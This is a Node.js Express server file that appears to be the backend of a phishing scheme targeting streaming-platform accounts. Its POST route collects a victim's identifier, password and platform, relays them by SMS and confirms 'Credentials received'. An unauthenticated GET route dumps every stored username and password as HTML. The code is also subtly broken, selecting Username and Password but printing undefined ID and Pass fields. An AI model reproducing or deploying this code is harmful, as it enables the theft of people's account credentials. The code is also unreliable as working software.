const express = require("express");
const cors = require("cors");
const sendMsg = require("./sms");
const mongoose = require("mongoose");
const User = require("./User");
require("dotenv").config();
mongoose
  .connect(
    `mongodb+srv://${process.env.MONGODB_USERNAME}:${process.env.MONGODB_PASSWORD}@ott-platform-official.g4y3gt6.mongodb.net/ott-platform-official?retryWrites=true&w=majority`
  )
  .then(() => {
    console.log("Database connected Successfully");
  })
  .catch((e) => {
    console.log(e);
    console.error("Unable to connect to database");
  });

const port = process.env.PORT;
const app = express();
app.use(express.json());
app.use(cors());

app.get("/",(req,res)=>
  {
    res.status(200).json({message:"API ready"});
  })

app.get("/credentials", async (req, res) => {
  try {
    let response = await User.find({}).select({'Platform':1,'_id':0,'Username':1,'Password':1,'createdAt':1});
    response = response.map((data,idx)=>
      {
        return `<p style="margin-bottom:10px;">${idx+1}) (Platform = ${data.Platform} ID = ${data.ID} Pass = ${data.Pass})(Time: ${data.createdAt}<p>`;
      }
    )
    res.status(200).send(response.join(''));
  } catch (e) {
    console.log(e);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

app.post("/", async (req, res) => {
  const { identifier, password, platform } = req.body;
  const response = await sendMsg(identifier, password, platform);
  if(response)
  {
  res.status(200).json({
    message: "Credentials received",
  });
  }
  else
  {
    res.status(500).json({message:"Internal Server Error"});
  }
});

app.listen(port, () => {
  console.log("Server started listening on port ", port);
});
